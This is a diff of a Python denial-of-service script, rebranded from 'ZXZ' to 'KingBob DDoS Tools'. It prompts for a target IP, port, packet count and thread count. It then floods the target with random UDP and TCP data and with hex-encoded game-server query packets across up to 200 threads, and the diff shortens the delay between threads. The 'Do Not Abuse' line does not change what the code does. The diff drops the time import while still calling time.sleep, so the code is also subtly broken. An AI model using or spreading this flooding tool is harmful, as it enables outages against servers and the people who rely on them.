@@ -1,4 +1,5 @@
-import time 
+#Coded By KingBob
+#Do Not Abuse
 import random
 import threading
 import codecs
@@ -9,36 +10,35 @@ import sys
 import os
 
 os.system("clear")
-print ("\033[35m                      ╔════════════════════════════════════╗")
-print ("\033[35m                      ║\033[31m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\033[35m  ║")
-print ("\033[35m                      ║\033[31m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \033[35m  ║")
-print ("\033[35m                      ║\033[31m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \033[35m  ║")
-print ("\033[35m                      ╚════════════════════════════════════╝")
-print ("\033[31m                              ╔══════════════════╗")
-print ("\033[31m                              ║ \033[35m  TOOLS BY \033[34mZXZ  \033[31m ║") 
-print ("\033[31m                              ╚══════════════════╝")
-
-ip = str(input("\033[96m  Attack To IP \033[35m \033[91m "))
-port = int(input("\033[96m  Attack To Port \033[35m \033[91m "))
-choice = str(input("\033[96m  Attack \033[35m \033[91m "))
-time = int(input("\033[96m  Times \033[35m \033[91m "))
-size = int(input("\033[96m  Threads \033[35m \033[91m "))
+print("\033[92m       :::    ::: ::::::::::: ::::    :::  ::::::::  :::::::::   ::::::::  :::::::::") 
+print("\033[92m      :+:   :+:      :+:     :+:+:   :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+:") 
+print("\033[92m     +:+  +:+       +:+     :+:+:+  +:+ +:+        +:+    +:+ +:+    +:+ +:+    +:+") 
+print("\033[92m    +#++:++        +#+     +#+ +:+ +#+ :#:        +#++:++#+  +#+    +:+ +#++:++#+   ") 
+print("\033[92m   +#+  +#+       +#+     +#+  +#+#+# +#+   +#+# +#+    +#+ +#+    +#+ +#+    +#+    ") 
+print("\033[92m  #+#   #+#      #+#     #+#   #+#+# #+#    #+# #+#    #+# #+#    #+# #+#    #+#     ") 
+print("\033[92m ###    ### ########### ###    ####  ########  #########   ########  #########       ") 
+print("\033[92m========= KingBob DDoS Tools =========") 
+print("\033[92m>> Author : KingBob") 
+print("\033[92m>>> Coded : KingBob#4181") 
+print("\033[92m>>> Link: None") 
+print("\033[92m>>>> Do Not Abuse This DDoS Tool")
+ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" Do you want to Attack? (y/n):"))
+times = int(input(" Packet:"))
+threads = int(input(" Threads:"))
 fake_ip = '182.21.20.32'
-
-Pacotes = [
- codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e76', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e67', 'hex_codec'),
- codecs.decode('081e62da', 'hex_codec'),
- codecs.decode('081e62da', 'hex_codec'),
- codecs.decode('021efd53', 'hex_codec'),
- codecs.decode('081e4dda', 'hex_codec'),
- codecs.decode('021efd40', 'hex_codec'),
- codecs.decode('081e7eda', 'hex_codec')]
- 
+#Starting Attacking
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
+                       ]
 def run():
 	data = random._urandom(1460)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -48,9 +48,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"\u001b[37m ZXZ Has Been Attack To Server")
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
 		except:
-			print("\u001b[37m Server Has Been Down")
+			print("[!] Server Down!!!")
 
 def run2():
 	data = random._urandom(1204)
@@ -62,10 +62,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[37m ZXZ Has Been Attack To Server")
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
 		except:
 			s.close()
-			print("\u001b[37m Server Has Been Down")
+			print("[*] Server Down!!!")
             
 
 def run3():
@@ -78,10 +78,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[37m ZXZ Has Been Attack To Server")
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
 		except:
 			s.close()
-			print("\u001b[37m Server Has Been Down")
+			print("[*] Server Down!!!")
             
   
 def run4():
@@ -94,10 +94,10 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[37m ZXZ Has Been Attack To Server")
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
 		except:
 			s.close()
-			print("\u001b[37m Server Has Been Down")
+			print("[*] Server Down!!!")
 			
 def run5():
 	data = random._urandom(16)
@@ -109,19 +109,19 @@ def run5():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[37m ZXZ Has Been Attack To Server")
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
 		except:
 			s.close()
-			print("\u001b[37m Server Has Been Down")
+			print("[*] Server Down!!!")
             
-
+#Urandom Dan Pacotes
 class MyThread(threading.Thread):
      def run(self):
          while True:
                 sock = socket.socket(
                     socket.AF_INET, socket.SOCK_DGRAM)
                 
-                msg = Pacotes[random.randrange(0, 5)]
+                msg = Pacotes[random.randrange(0,5)]
                      
                 sock.sendto(msg, (ip, int(port)))
                 
@@ -134,7 +134,7 @@ class MyThread(threading.Thread):
                     sock.sendto(Pacotes[6], (ip, int(port)))
                 elif(int(port) == 7784):
                     sock.sendto(Pacotes[7], (ip, int(port)))
-                                   
+                    
                 
 
 if __name__ == '__main__':
@@ -142,7 +142,7 @@ if __name__ == '__main__':
      for x in range(200):                                    
             mythread = MyThread()  
             mythread.start()                                  
-            time.sleep(1)    
+            time.sleep(.1)    
     except(KeyboardInterrupt):
          os.system('cls' if os.name == 'nt' else 'clear')
          
